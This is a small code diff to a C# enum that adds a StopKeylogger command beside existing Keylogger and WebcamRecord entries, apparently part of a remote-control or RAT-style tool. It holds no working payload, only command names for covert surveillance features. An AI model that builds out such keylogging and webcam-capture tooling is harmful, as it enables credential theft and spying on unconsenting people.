@@ -87,7 +87,8 @@ namespace Shared
         WebcamRecord,   // Quay webcam
 
         // ===== INPUT =====
-        Keylogger
+        Keylogger,
+        StopKeylogger
     }
 
 
